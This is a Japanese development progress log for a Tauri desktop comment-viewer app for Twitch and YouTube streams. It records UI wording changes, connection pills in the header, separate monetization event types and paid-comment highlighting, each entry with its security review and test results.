  （久しぶり／常連（1 ヶ月未満）／境界（丁度 1 ヶ月=久しぶり・1 秒手前=否）／久しぶり後の二重記録は false/false・総数不変）。
  **viewer_memory 31 tests PASS**。frontend は既存 **33 tests PASS**（`renderDefaultItem` 改修の回帰なし）。
- **security-review（軽・通過）**: frontend 表示＋038a 判定消費＋`record_comment` 戻り値拡張のみ。**新規宛先/API/capability/依存なし・
  `csp:null` 不変・保存範囲不変**（`Cargo.toml`/`Cargo.lock`/`capabilities/*`/`tauri.conf.json` 差分ゼロ）。`RecordResult` は真偽 2 値のみで
  視聴者本文/氏名/時刻を含まず**端末外/ログ非露出**（§9）。判定は端末内データ（永続 `last_comment_at`＋今回 `published_at`）のみ。
  後回し可: `viewerBadges` Map は肯定のみ格納で distinct 新規/復帰視聴者数にバウンド（メモリのみ・非送信＝非セキュリティ）。
- 検証: `cargo check` OK／`cargo test viewer_memory`（31）OK／`gen:bindings` drift ゼロ／`typecheck`・`lint` OK／`test`（33）OK。
- 実機表示はユーザー環境で確認予定: 新規視聴者→「初見」／`last_comment_at` を 1 ヶ月以上前に細工した視聴者の新規コメント→
  「久しぶり」＋枠色／既存常連はバッジ無し／通常コメント表示が壊れない。再起動をまたいでも永続 `last_comment_at` 基準で正しい。

## 2026-07-26 (042/043/044 タスク追加＝5要望のタスク化・計画のみ)

ユーザーの 5 要望（①OBS オーバーレイ ON で OBS にソース自動追加／②配信接続の文言「接続」→「連携」／③接続 UI を
コメビュ本体へ・プラットフォーム別カード化／④オーバーレイで投げ銭コメントを強調／⑤お金がかかるコメントを全種別
コメビュに反映）を、調査（Explore 3 本＋主要ファイル精読）のうえ **3 機能領域・10 本のタスク仕様書**へ分割して追加した。
**本コミットは docs のみ（実装コード変更なし）**。計画は `~/.claude/plans/tasks-noble-pnueli.md`。

- **要望→タスク**: ②→042a／③→042b／⑤→043a(取得精緻化)＋043b(本体表示)／④→043c／①→044s(スパイク)＋044a(実装)。
- **042 配信連携 UX**（親＋042a 文言「連携」＋042b 本体カード化）: 033b の「接続 UI を設定ビューへ集約」を**部分反転**し
  本体へ戻す。main no-internet／窓内 WS 1 本は不変。042a=軽 / 042b=軽 security-review。
- **043 投げ銭強調＋取得精緻化**（親＋043a/043b/043c）: 現状 `event_type`/`monetary` は全層配線済みだが本体 `renderDefaultItem`・
  overlay `renderOverlayItem` は `event_type` で分岐せず、サブスク/メンシプ/ギフトは通常コメントと区別されない。043a で
  sidecar/wire/Rust を拡張しメンシプ実発行・ギフト区別（**security-review 必須**）、043b/043c で本体・オーバーレイに強調表示
  （軽）。ユーザー選択＝**網羅重視（取得精緻化まで含む）**。**保留中の 037/037b（オーバーレイ投げ銭強調）は 043c に supersede**
  （現行意匠単独・037a 意匠選択機構には非依存）。
- **044 OBS 自動ソース追加**（親＋044s スパイク＋044a 実装）: **033/033f の「obs-websocket 不使用」決定を反転**する。obs-websocket は
  新規 loopback 通信(127.0.0.1:4455)＋新規依存(`obs-websocket-js`・sidecar 側)＋（方式次第で）ローカル HTTP サーバを伴い §1/§10/
  レビュー必須条件に該当。ユーザー選択＝**スパイク先行**。044s で方式 A(ウィンドウキャプチャ) / B(ブラウザソース+HTTP) を実測決定し
  044a で実装（**security-review 必須**）。task-board 上は当面「保留」（スパイク後に Next 昇格）。
- **索引更新**: task-board.md に 042/043 を Next、044 を保留に追加。037b 行に「043c へ supersede」を注記。
- **スコープ外の明示**: 「ジュエル」等 YouTube/Twitch に存在しないマネタイズ種別（新規サービス連携＝別スコープ）。037a 意匠選択機構の復帰。
- 検証: 実装コード変更なし＝ビルド影響なし。`git status` で追加/更新が docs/tasks 10 本＋task-board.md＋progress.md のみであることを確認済み。
- 次段: ユーザーの「実装して」指示後、042a→042b／043b→043a→043c／044s→044a の順に **1 機能ずつ**着手（各タスクのレビュー要否に従う）。

## 2026-07-26 (042a 「接続」文言の是正＝OAuth リンク→連携 / カード見出し→コメント取得)

設定ビュー（コメントビューア）で **OAuth リンク操作の「接続」表記を「連携」に是正**した。実態はアカウント連携で、
配信への接続（コメント取得）とは別概念。**frontend 表示文言のみ**の変更で、ロジック/API/WS/依存は一切触っていない。

- **変更した 3 箇所（`apps/desktop/src/screens/comment-viewer/SettingsView.tsx` のみ）**:
  - 147 行 カード見出し `接続` → **`コメント取得`**。
  - 159 行 Twitch OAuth リンクボタン `{linked ? "接続済み" : "接続"}` → `{linked ? "連携済み" : "連携"}`。
  - 222 行 YouTube OAuth リンクボタン `{youtubeLinked ? "接続済み" : "接続"}` → `{youtubeLinked ? "連携済み" : "連携"}`。
- **見出しを「連携」でなく「コメント取得」にした理由（親 042a ドキュメントからの意図的な逸脱・ユーザー指示）**:
  当該カードは OAuth リンク（連携）だけでなく **コメント取得開始／停止も含む枠**なので、見出しを「連携」にすると不正確。
  ユーザー確認により、見出しは枠の実態に合わせて「コメント取得」とし、OAuth リンク文言（連携）はボタンに限定した。
- **状態表示の「アカウント連携を接続と呼んでいる箇所」条件は該当なし**（調査で確認）。SettingsView/StatusIndicator の
  「接続中/接続済み」はすべて 取得セッション状態か WS/sidecar プロセス接続で、アカウント連携を指すものは既に「連携/同意」表記。
- **触らなかった別概念の「接続」（意味が壊れるため据え置き）**: `SESSION_STATE_LABEL`（29 行 `connecting:"接続中"`）・
  `StatusIndicator.tsx` の `STATUS_LABEL`（`接続中`/`接続済み`＝session.state）、191/245 行 `コメント取得プロセスに接続中…`、
  174/232 行 `コメント取得開始`・182/240 行 `停止`、既に連携/同意表記（202 行 device code・247 行 同意・VOICEVOX自動連携）。
  コード内コメント（144 行 `接続カード`・148 行の列一覧）は「表示文言のみ」方針に従い据え置き（042b のカード再設計時に書き直す）。
- **security（軽・通過）**: frontend 表示文字列 3 箇所のみ。新規宛先/API/Tauri command/capability/依存なし・`csp:null` 不変・
  ログ出力/保存の変更なし。ハンドラ・disabled 条件・WS 制御フレームは不変（`git diff --stat`＝SettingsView.tsx 1 ファイル・3 行）。
- 検証: `pnpm --filter ./apps/desktop typecheck` OK ／ `lint` OK。実機表示はユーザー環境で確認予定
  （見出し「コメント取得」・Twitch/YouTube のリンクボタンが「連携／連携済み」・取得開始/停止・状態表示は従来どおり）。
- 次段: 042b（本体 `StatusIndicator` を Twitch/YouTube 別カード化＋設定ビューの接続 UI を本体へ移設・撤去。軽 security-review）。

## 2026-07-26 (042b 接続 UI をコメビュ本体へ・プラットフォーム別 展開カード化)

配信接続の状態と操作を、コメビュ**本体**の**プラットフォーム別カード**（Twitch / YouTube を別々の枠付きカード）へ集約した。
折りたたみ時は接続状態（円色＋テキスト）、クリックで展開して**連携・取得開始・停止**を行える。033b の「接続 UI を設定ビューへ
集約」を**部分反転**して本体カードへ戻したもの。**安全設計（窓内 WS 1 本・main 窓 no-internet・新規 command/capability/依存なし・
`csp:null`）は不変で踏襲**。042a（文言「連携」）済みを前提に、文言はそのままカードへ移設した。

- **本体カードの構成**（`CommentViewerApp.tsx`・`view === "comment"`）: ツールバーから `StatusIndicator` を撤去し、直下に
  Twitch / YouTube の `ConnectionCard` を 2 枚配置。**折りたたみ頭**＝円ドット（`STATUS_DOT_CLASS`）＋サービス名＋状態ラベル
  （`deriveConnectionStatus`/`STATUS_LABEL`）を `<button aria-expanded>` で提示（クリック／Enter・Space／フォーカスは button 標準）。
  **展開本体**＝連携（`startLogin`）／取得開始（`startSession`）／停止（`stopSession`）。Twitch はチャンネル入力・device code 提示も
  同カード内。詳細状態テキスト（`SESSION_STATE_LABEL`＋`!streamConnected` 時「コメント取得プロセスに接続中…」・YouTube の
  「ブラウザで同意してください…」）は既存の出し分けをそのまま移植。展開状態は本体ローカル state `expanded: {twitch, youtube}`
  （既定 折りたたみ）。**既存ハンドラ（`handleTwitchConnect`/`handleStartSession`/`handleStopSession`/YouTube 系）と制御フレームを
  そのまま呼び、新規追加なし**。
- **status ロジックの再利用方式**: `StatusIndicator.tsx` の file-local だった `ConnectionStatus`/`deriveConnectionStatus`/`STATUS_LABEL`
  を、docstring の指示どおり非 React ロジック用 `features/comment-viewer/connectionStatus.ts` へ**移設・export（単一化）**。
  非コンポーネントファイルなので `react-refresh/only-export-components` を壊さない。**ロジックは複製していない**。
  `STATUS_DOT_CLASS`（status → CSS Module クラスの対応表）は CSS 結合のため `ConnectionCard` が単独所有。
- **`ConnectionCard` の有無**: 新規に切り出した（presentational・`screens/comment-viewer/ConnectionCard.tsx`）。汎用の折りたたみ
  展開カード（頭＝状態表示／body＝`children`）で、**サービス固有の操作フォームは既存 state/ハンドラのある `CommentViewerApp` 側に
  置き `children` で渡す**。ConnectionCard は WS・通信面を一切持たない（表示専用）。
- **SettingsView の撤去範囲**: 「コメント取得」カード（旧 146-256）を撤去し、接続系 props（`streamConnected`/`linked`/`sessionState`/
  `sessionReason`/`deviceCode`/`channel`/`onChannelChange`/`onTwitchConnect`/`onStartSession`/`onStopSession`/YouTube 系）と
  `SESSION_STATE_LABEL`（→CommentViewerApp へ移設）・`DeviceCodePrompt` import を除去。**読み上げ（VOICEVOX）／OBS オーバーレイの
  カード・戻る/歯車導線・`ttsEnabled` は残置**（VOICEVOX/overlay は不変）。
- **削除**: `StatusIndicator.tsx`（置換で未使用化・テスト参照なし・ロジックは connectionStatus.ts へ移設済み）。
- **WS 1 本/main no-internet 確認**: `connectCommentStream` を呼ぶのはコメビュ窓内で `CommentViewerApp` の useEffect **1 箇所のまま**
  （ConnectionCard/connectionStatus は WS を持たない＝カード化で二重化せず）。接続 UI・sidecar 通信は comment-viewer webview に
  閉じたまま（本体へ移しても main 窓へ出さない）。宛先 `ws://127.0.0.1:<port>` 不変。
- **security-review（軽・通過）**: ①複数 WS を張っていない ②main へ通信を漏らしていない ③新規 command/capability/依存を足していない、
  を確認して通過。diff は frontend のみ（`Cargo.*`/`capabilities/*`/`tauri.conf*`/`package.json`/`pnpm-lock.yaml` 差分ゼロ）＝
  `csp:null` 不変・新規宛先/API なし。取得コメント本文のログ/DB 出力は増やしていない。後回し可: 未参照化 dead CSS は計 5 クラス
  ＝旧グリッド `.connGrid`/`.connSpan`/`.connService`＋StatusIndicator.tsx 削除で新たに `.statusRow`/`.statusIndicator`（残置・害なし）。
- **変更/作成ファイル**（`git diff --stat`＝4 変更＋2 新規）: 変更＝`CommentViewerApp.tsx`／`CommentViewerApp.module.css`
  （`.connCardHead`/`.connChevron`/`.connActions` 追加・`.toolbar` を `flex-end` へ）／`SettingsView.tsx`、削除＝`StatusIndicator.tsx`、
  新規＝`features/comment-viewer/connectionStatus.ts`／`screens/comment-viewer/ConnectionCard.tsx`。
  （注記: 本行は base 実装時点の記録。直後の「042b デザイン改修＝ヘッダー内 接続ピル＋ポップオーバー」節で `.connCardHead`/`.connChevron` は
  撤去・`.toolbar` は `space-between` へ再変更したため、HEAD を diff した最終形とは一致しない＝時系列ログとして下記 改節が正。）
- 検証: `pnpm --filter ./apps/desktop typecheck` OK ／ `lint` OK。実機表示・`lsof -i` の no-internet 確認はユーザー環境で予定
  （本体で Twitch/YouTube カードの折りたたみ状態表示→クリック展開→連携/取得開始/停止 が完結／設定ビューに接続カードが無い
  （VOICEVOX/OBS/歯車は残る）／既存の連携・取得・停止・device code・状態表示が退行なし）。
- 次段: 043 系（投げ銭強調＋取得精緻化）または 044 系（OBS 自動ソース追加スパイク）を、ユーザー指示後に 1 機能ずつ着手。

## 2026-07-26 (042b デザイン改修＝ヘッダー内 接続ピル＋ポップオーバー)

042b の接続カードの見た目・操作導線をユーザー指摘で作り替えた（**frontend の UI 再構成のみ**・接続フロー/sidecar/制御フレームは不変）。
本体下の「縦積み・インライン展開カード」を、**ヘッダー（ツールバー）内の横長・角丸ピル 2 枚（Twitch / YouTube を横並び）**にし、
ピルをクリックすると**ピル直下に非モーダルのポップオーバー（別カード）を重ねて出す**方式へ変更。**他要素の位置は動かさない**
（`position:absolute`）／**1 つずつ開く（ラジオ排他）**／**外側クリック・Esc で閉じる**。

- **配置**（`CommentViewerApp.tsx`・`view === "comment"`）: `.toolbar` を `flex-end`→`space-between` に戻し、**左＝`.connCluster`（接続ピル群）／
  右＝`.toolbarActions`（読み上げトグル＋視聴者＋設定）**。本体下にあった旧カード 2 枚は撤去（クレジット等の順序・位置は不変）。
- **状態モデル**: 独立 bool の `expanded:{twitch,youtube}` を廃し、**単一 `openCard: "twitch" | "youtube" | null`** へ。一方を開くと他方は
  自動で閉じる（ラジオ）が state 構造で保証される。**外側クリック/Esc** は `openCard!==null` の間だけ document に `pointerdown`/`keydown`
  リスナを張る UI 専用 `useEffect`＋`connClusterRef` で実装（cluster 内＝他方ピル押下はトグル切替／ポップオーバー内クリックでは閉じない）。
  **WS の `useEffect` は非変更**（窓内 WS 1 本のまま）。
- **`ConnectionCard` の作り替え**（presentational）: 折りたたみカード→**ピル（`<button aria-haspopup="dialog" aria-expanded>`）＋
  `open` 時のみ描画する `role="dialog"` ポップオーバー**へ。props は `{service, sessionState, open, onToggle, children}`。状態導出
  （`deriveConnectionStatus`/`STATUS_LABEL`）・色覚非依存ラベルは不変。操作フォーム（連携/取得開始/停止・device code・状態テキスト・
  disabled 条件・出し分け・文言）は**そのまま `children` として移植**（退行なし）。シェブロン `▸/▾` は廃止。
- **CSS**（`CommentViewerApp.module.css`）: `.connCluster`／`.connPillWrap`(relative)／`.connPill`(横長丸角・hover・`[aria-expanded="true"]`
  で縁強調・`:focus-visible` リング)／`.connPopover`(absolute・`top:calc(100%+6px)`・`z-index:40`・surface・border・`box-shadow` は
  `var(--popover-shadow)`・`min-width:280px`/`max-width:calc(100vw-32px)`) を追加。旧 `.connCardHead`/`.connChevron` は未参照化のため撤去。
  `.connActions`/`.connActions .input` はポップオーバー内で継続利用。`.toolbar` を space-between へ。全て role トークン（生 hex/rgba なし）。
- **theme.css**: ポップオーバーの落ち影用に `--popover-shadow`（`color-mix` 派生・:root 基底のみ＝両テーマ共通）を 1 つ追加。生 hex は本トークンに閉じ込め。
- **security（軽・据え置き）**: ①窓内 WS 1 本（`connectCommentStream` の useEffect 非変更・外側クリック effect は DOM リスナのみで WS を張らない）
  ②main 窓へ通信を漏らさない（変更は comment-viewer webview 内のみ・宛先 `ws://127.0.0.1:<port>` 不変）③新規 command/capability/依存なし
  （`src-tauri/**`・`capabilities/*`・`tauri.conf.json`〔`csp:null`〕・`Cargo.*`・`package.json`・`pnpm-lock.yaml` 差分ゼロ）。`docs/security.md` 非改訂。
- **テスト**: `ConnectionCard.test.tsx` を新契約（ピル＋ポップオーバー・`aria-haspopup`/`aria-expanded`・open で dialog+children 描画・
  クリックで onToggle）へ更新。`connectionStatus.test.ts` は純ロジック不変で流用。ラジオ排他・外側クリックは `CommentViewerApp`（WS/TTS 依存で
  単体化しない方針）側のため**手動 E2E**で確認。
- **変更ファイル**: `CommentViewerApp.tsx`／`CommentViewerApp.module.css`／`ConnectionCard.tsx`／`ConnectionCard.test.tsx`／`styles/theme.css`／
  `docs/progress.md`（Rust・capability・tauri.conf・Cargo・package.json・pnpm-lock・security.md は差分ゼロ）。
- 検証: `pnpm --filter ./apps/desktop typecheck` OK ／ `lint` OK ／ `test` OK（8 files / 53 tests）。**実機表示・`lsof -i` の no-internet は
  ユーザー環境で予定**（ヘッダーに横並びピル→クリックで下にポップオーバー→他方を開くと閉じる→外側クリック/Esc で閉じる→他要素が動かない／
  連携・取得開始・停止・device code・状態表示が退行なし）。

## 2026-07-26 (043a 投げ銭イベントの取得精緻化＝メンシプ／ギフトの種別分離)

親 043 の要望⑤（お金がかかるコメントを種別ごとに把握・網羅重視）の取得層。現状すべて `subscription` に潰れていた**メンシプ／ギフトを
種別として分離**し、可能な範囲で継続月数・ギフト件数・階級を数値で拾って、表示（043b/043c）が種別・金額を出せる語彙を全レイヤー一貫で整えた。
**受信済みフィールドの分類/取り回しのみ**で、新規の外部通信・宛先・OAuth スコープ・依存は増やさない（**security-review 済＝指摘なし**）。

- **設計判断（ユーザー承認）**: ①ギフト表現＝**(A) `gift` を新 `event_type` に追加**（membership も既存 Rust `Membership` を実発行）。②付随フィールド＝
  **Tier2**（数値のみ・`monthCount`/`giftCount`/`tier` を wire＋Rust DTO に載せる・**受贈者名は載せない/保存しない＝§9**）。③集計＝**既存集計に統合
  （追加列なし）**。④ビッツ＝**据え置き**（`superchat`＋`currency="BITS"`）。
- **membership 分離と拾ったフィールド**: YouTube `NEW_SPONSOR_EVENT`/`MEMBER_MILESTONE_CHAT_EVENT` を `subscription`→**`membership`** に。
  `member_milestone_chat_details.member_month`（既受信）を `monthCount` として拾う（新規メンバーは月数なし＝undefined）。YouTube ギフトメンシプは
  proto/DTO に無い＝**対象外**。Twitch は `sub_gift`/`community_sub_gift`→**`gift`**（`giftCount`＝community の `total`／単発は 1・`tier`＝`sub_tier`→1/2/3）、
  `sub`/`resub`/`pay_it_forward`→`subscription`（`monthCount`＝resub の `cumulative_months`・`tier`）。**Twitch raw DTO（`TwitchChatNotificationEventDto`）に
  EventSub が既送の `sub`/`resub`/`sub_gift`/`community_sub_gift` 付随オブジェクトを追加**（受贈者フィールドは §9 配慮で意図的に非モデル化）。
- **全レイヤー語彙対応（一貫）**: shared `comment-types.ts`（`CommentEventType` に `membership`/`gift`・`COMMENT_EVENT_TYPES` 追加）→ domain
  `comment.ts`（`monthCount`/`giftCount`/`tier` 追加）→ YouTube/Twitch マッパ → converter `comment-to-view.converter.ts`（3 値パススルー）→
  shared `comment-view.dto.ts` → wire `wire.ts`（`CanonicalCommentEventType` に `gift`・`EVENT_TYPE_MAP` に membership/gift〔**total `Record` が漏れをコンパイル検出**〕・
  `CanonicalComment`＋`toCanonicalComment` に 3 値）→ Rust `comment_viewer/model.rs`（`CommentEventType::Gift`＋`as_str`・`CommentViewDto` に
  `month_count`/`gift_count`/`tier: Option<u32>` `#[ts(optional)]`）→ **binding 再生成**（`CommentEventType.ts`＝5値化・`CommentViewDto.ts`＝3 フィールド追加・
  他 binding は drift なし）。`viewer_memory/service.rs` は `event_type.as_str()` 経由で `"gift"` を自動保存（新設数値は**読まず非永続**）。
- **集計波及の修正（方針⑪＝集計項目の変更）**: `viewer_memory/repository.rs` の `subscription_count`/`is_member`/`last_subscription_at` を
  `event_type IN ('subscription','membership','gift')` に変更（定数リテラルのみ）。分離前は全て `'subscription'` に畳まれ集計に入っていたため
  **同一集合＝退行/取りこぼしゼロ・列追加なし**。累計月数/ギフト件数は wire 表示用のみで**端末保存しない**近似（`is_member`＋回数のみ）を維持。旧「membership 未到達」コメントを実態へ更新。
  非退行テスト `membership_and_gift_count_into_subscription_family` を追加（membership+gift+subscription=3・superchat 不変を検証）。
- **表示ラベル consistency**: `screens/comment-viewer/viewerFormat.ts` の `EVENT_LABEL` に `gift: "ギフト"` を追加（視聴者詳細パネルで gift が空ラベルにならない・043b/043c 意匠ではない）。
- **dev-mock**: `dev-mock.ts` に membership（YouTube・monthCount）/gift（Twitch・giftCount/tier）/subscription（Twitch・monthCount/tier）サンプルを周期発行（ユーザーの目視確認用）。
- **security.md 更新**: 「コメントビューア方針」⑪ に 043a の集計項目変更（membership/gift の種別分離と既存集計への統合・列追加なし・`monthCount`/`giftCount`/`tier` は wire のみ非永続・受贈者名は非取得）を追記。
- **security（必須・実施済＝指摘なし）**: ①新規宛先/OAuth スコープ/依存ゼロ（`host-guard.ts`/`twitch-config.ts`/`youtube-config.ts`/proto/`Cargo.*`/`package.json`/`pnpm-lock.yaml`/capability/`tauri.conf.json`〔`csp:null`〕は**差分ゼロ**・`build:bundle` 禁止依存アサート通過）②env ピン留め・二層 fail-closed 不変
  ③投げ銭金額/受贈者名を非ログ・非外部送信（**受贈者名は wire にも Rust DTO にも載せない**）④集計変更は視聴者メモリの端末内範囲（方針⑪）に収まる。
  後回し awareness＝新設 wire 数値を将来 `viewer_comments` に保存するなら §9/⑪ で再レビュー。
- **変更ファイル（15）**: sidecar＝`vendor/shared/src/comment/comment-types.ts`・`comment-view.dto.ts`／`vendor/comment-fetcher/src/entities/comment/comment.ts`／
  `.../youtube/mapper/comment.mapper.ts`／`.../twitch/dto/raw.dto.ts`・`.../twitch/mapper/comment.mapper.ts`／`vendor/comment-delivery/.../comment-to-view.converter.ts`／
  `src/wire.ts`・`src/dev-mock.ts`。desktop＝`src-tauri/src/comment_viewer/model.rs`／`src-tauri/src/viewer_memory/repository.rs`（＋テスト）・`service.rs`（テスト literal）／
  `src/features/comment-viewer/bindings/CommentEventType.ts`・`CommentViewDto.ts`（再生成）／`src/screens/comment-viewer/viewerFormat.ts`。docs＝`security.md`・`progress.md`。
- 検証: `cargo check` OK ／ `cargo test viewer_memory` OK（34 tests・新テスト含む）／ `pnpm --filter ./apps/desktop typecheck` OK ／ `lint` OK ／
  `gen:bindings` 後の drift は意図どおり（`CommentEventType.ts`／`CommentViewDto.ts` のみ）／ sidecar `typecheck` OK ／ `build:bundle` OK（禁止依存なし）。
  **実機表示（`tauri dev` の dev-mock/実配信）・`lsof -i` の no-internet はユーザー環境で予定**（membership/gift が subscription と区別されて wire→Rust→binding に届く／
  既存 superchat/bits/subscription の取得・集計・表示が退行しない／視聴者メモリの is_member/subscription 集計が membership/gift を取りこぼさない／外部 ESTABLISHED は sidecar PID 下・既存 allow-list のみ）。

## 2026-07-26 (043a 拡張: 収益種別の網羅化＝charity/paid_upgrade/shared_chat/Bits Power-ups＋YouTube 分は 043d 起票)

上記 043a（membership/gift 分離）の後、ユーザー要望で **「お金がかかる系コメント／ギフトの全網羅」** を同タスクで達成するため取得層を拡張した。
YouTube/Twitch 公式仕様のネット調査（`liveChatMessages` の `snippet.type` 全 enum・EventSub `channel.chat.notification` の notice_type 全集合）と
実 wire 検証（twitch-rs 実ペイロード・twitchdev/issues#1039）で取りこぼしを洗い出し、**同一 allow-list ホスト上で拾える収益イベントを追加**した。
YouTube のギフトメンシプ／Jewels は **API に存在するが gRPC proto のフィールド番号が非公開で受信できない**ため、推測実装せず **[043d](tasks/043d-youtube-jewels-gift-membership.md) を起票**して保留にした。

- **Twitch 収益取りこぼしの取り込み（既存 `channel.chat.notification` 上・新規宛先/依存ゼロ）**:
  - **チャリティ・ドネーション**（`charity_donation`）＝新種別 **`donation`**（実金銭・サブスク/ギフトと分離）。`amount{value,decimal_places,currency}` を
    `value/10^decimal_places` で通常単位へ換算し monetaryAmount として通す。`viewer_comments` に行保存されるが **集計 rollup 列は作らない**（§9/⑪「列追加なし」維持）。
  - **有料化**（`gift_paid_upgrade`/`prime_paid_upgrade`）＝`subscription` に分類（従来 notice_type 未収載で drop していた取りこぼし・`prime_paid_upgrade.sub_tier` を tier に）。
  - **共有チャット収益**（`shared_chat_*`）＝mapper で接頭辞を剥がして同一分類（取りこぼし防止・数値内訳は shared 経路で undefined に劣化）。
- **Twitch Bits Power-ups（`channel.bits.use`・OAuth スコープ拡大）**:
  - `TWITCH_SCOPES` に **`bits:read` を追加**、EventSub に **`channel.bits.use` 購読を追加**（`condition` は `broadcaster_user_id` のみ＝Helix の condition 型で user_id を任意化）。
  - **購読作成は非致命**（`Promise.all` 内で `.catch()`＝旧トークンは bits:read 欠如で 403 でも本線 2 購読・配信を止めない。ユーザー再ログインで有効化）。
  - **cheer 二重計上回避**＝cheer は `channel.chat.message` で取得済のため mapper で bits.use の `type==="cheer"` を捨て、**power_up のみ superchat＋`currency="BITS"`** に集約。
  - `channel.bits.use` はイベント本体に一意 id が無いため、EventSub envelope の `metadata.message_id` を websocket client で補填（dedup キー）。repository のアバター解決は
    `chatter_user_id ?? user_id` を吸収し、どちらも無い場合はスキップ（Helix を undefined で叩かない）。
- **語彙・全レイヤー整合**: shared `comment-types.ts`／wire `wire.ts`（`EVENT_TYPE_MAP` total Record が漏れをコンパイル検出）／Rust `model.rs`（`CommentEventType::Donation`＋`as_str`）／
  binding 再生成（`CommentEventType.ts` に `donation`・`CommentViewDto.ts` は不変）／`viewerFormat.ts`（`donation:"ドネーション"`）。受贈者/贈与者/団体の個人名は wire/Rust DTO に載せない（§9）。
- **集計**: `donation` は subscription 系にも superchat/bits 系にも入れない（新種別・rollup 列なし）。非退行テスト `donation_is_not_counted_in_subscription_or_superchat` を追加。
- **dev-mock**: donation（Twitch・1000 JPY）/power-up（Twitch・300 bits→superchat+BITS）サンプルを周期追加（seq%20=3/11・%5≠0 で衝突なし）。
- **docs**: security.md 方針①/⑦（`bits:read`＋`channel.bits.use`＝宛先増えず・スコープ拡大＝再同意）・⑪(043a 節)を更新／親 043・043a/b/c の「ジュエル＝存在しない」**誤根拠を訂正**（存在するが未受信＝043d）／
  043d 起票（フィールド番号非公開の技術ブロッカーと解除条件を明記）／task-board に 043d 追加・043a 行更新。
- **security（拡張分・実施済）**: ①新規宛先ゼロ・依存ゼロ（`Cargo.*`/`package.json`/`pnpm-lock.yaml`/capability/`tauri.conf.json`〔`csp:null`〕差分ゼロ・`build:bundle` 禁止依存アサート通過）
  ②env ピン留め・二層 fail-closed 不変 ③**OAuth スコープ `bits:read` 追加のみが権限拡大**（宛先は不変・購読非致命・再同意で有効化）④受贈者/贈与者/団体名を非モデル化・非保存・非ログ（§9）⑤集計は端末内範囲（⑪）・rollup 列なし。
- **検証**: `cargo test viewer_memory` OK（35 tests・donation 非退行含む）／ desktop `typecheck`・`lint` OK ／ sidecar `typecheck` OK（EVENT_TYPE_MAP 網羅）・`build:bundle` OK（禁止依存なし）／
  `gen:bindings` drift は `CommentEventType.ts`（donation）／`CommentViewDto.ts`（043a 既存）のみ。**実機（`tauri dev` dev-mock/実配信）・`lsof -i` の no-internet はユーザー環境で予定**
  （donation/power-up が種別区別されて届く／既存取得・集計が退行しない／Power-ups は再ログイン後に届く／外部 ESTABLISHED は sidecar PID 下・既存 allow-list のみ）。

## 2026-07-26 (043a 追補: dev-mock の課金チャット網羅＋jewels 表示語彙の先行追加)

実機確認でモックを使うため、dev-mock に**各課金チャット種別を網羅**させ、ユーザー指示で **Jewels も先行追加**した。Jewels の**取得（ingestion）は
引き続き 043d**（gRPC proto フィールド番号が非公開）で、ここでは**表示語彙＋dev-mock 合成発行のみ**を先行させた（実データは 043d 後）。

- **dev-mock 網羅**（`COMMENT_SIDECAR_MOCK=1` 時のみ・外部通信なし）: membership(YouTube)/subscription(Twitch)/gift(Twitch)/donation(Twitch)/
  power-up(Twitch→superchat+BITS)/superchat(YouTube 実通貨)/bits(Twitch)/**jewels(YouTube・新規)** を周期発行（seq%20=3/7/9/11/13/17・%5≠0 で superchat と衝突しない）。
- **jewels 表示語彙を全レイヤー追加**（donation と同手順）: shared `comment-types.ts`／wire `wire.ts`（`EVENT_TYPE_MAP` に `jewels`）／Rust `model.rs`
  （`CommentEventType::Jewels`＋`as_str`）／binding 再生成（`CommentEventType.ts` に `jewels`）／`viewerFormat.ts`（`jewels:"ジュエル"`）。
  jewels は仮想通貨のため bits と同様に数値＋通貨（`JEWELS`）で表す。集計は既存（subscription/superchat/bits）に混ざらない（新種別・rollup 列なし）＝
  非退行テスト `jewels_is_not_counted_in_existing_aggregations` を追加。
- **043d 更新**: Jewels の表示語彙側は先行済み＝043d に残るのは実データ取得（proto 拡張）＋mapper 配線、と明記。
- **security**: 表示語彙＋合成モックのみ＝**新規宛先/OAuth スコープ/依存ゼロ**（jewels は実取得しないため受信面は増えない・§1/§9/§10 影響なし）。
- **検証**: `cargo test viewer_memory` OK（36 tests・donation/jewels 非退行含む）／ desktop `typecheck`・`lint` OK ／ sidecar `typecheck` OK・`build:bundle` OK（禁止依存なし）／
  `gen:bindings` drift は `CommentEventType.ts`（+jewels）／`CommentViewDto.ts`（043a 既存）のみ。

## 2026-07-26 (043b コメビュ本体の投げ銭強調＝赤枠＋種別ラベル＋種別文言)

実機確認で「サブスクが英語の system_message（resubscribe…）でしか出ない」「お金がかかる通知を目立たせたい」との要望を受け、
043b（コメビュ本体の表示強調）を実装した。043a で配線済みの数値（event_type/monthCount/tier/giftCount/monetary）を使い、
**表示分岐のみ**（新規通信/依存/capability ゼロ・軽レビュー相当）。対象は**コメビュ本体のみ**（OBS オーバーレイ＝043c は別途）。

- **赤枠強調**（要望④⑤）: chat 以外の課金系（superchat/subscription/membership/gift/donation/jewels）を `.itemMonetary`（border=danger＋inset shadow）で赤枠に。
  CSS ソース順で初見/久しぶり枠より後に定義＝**お金を最優先で赤枠**（同時該当時は赤が勝つ）。レイアウトはずらさない（inset shadow で 1px 厚見せ）。
- **種別ラベル**: `.badgeEvent`（warn 系ピル）で「サブスク/メンバーシップ/ギフト/ドネーション/スーパーチャット/ビッツ/ジュエル」を表示。ビッツは
  `displayEventType`（superchat＋currency=BITS→"bits"）でラベルのみ振り分け。
- **種別文言の組み立て**: 金額を持たないサブスク/メンシプ/ギフトは `composeEventMessage` で「〇〇さんがサブスクを3ヶ月継続しました（Tier2）」等を主表示。
  金額を持つ種別（スパチャ/ビッツ/ドネーション/ジュエル）は種別ラベル＋金額バッジ＋本文で表示（文言重複を避け null）。視聴者の自由コメントがあれば要約の下に本文を続ける。
- **043a 微調整**: Twitch notification の本文を `event.message.text || system_message` → `event.message.text` に（system_message は英語自動文＝ノイズ＋受贈者名を含み得る§9 のため保存/表示に載せない）。無メッセージ時は空文字＝表示側が要約のみ出す。
  dev-mock の subscription/membership/gift の text を調整（sub＝視聴者コメント例／memb・gift＝空＝要約のみ）。
- **対象ファイル**: `screens/comment-viewer/viewerFormat.ts`（`isMonetaryEvent`/`MONETARY_EVENT_TYPES`/`displayEventType`/`composeEventMessage`＋テスト）／
  `CommentList.tsx`（`renderDefaultItem` に赤枠クラス・種別ラベル・要約文言）／`CommentViewerApp.module.css`（`.itemMonetary`/`.badgeEvent`/`.eventMessage`）／
  sidecar `twitch/mapper/comment.mapper.ts`（本文フォールバック除去）・`dev-mock.ts`（文言調整）。
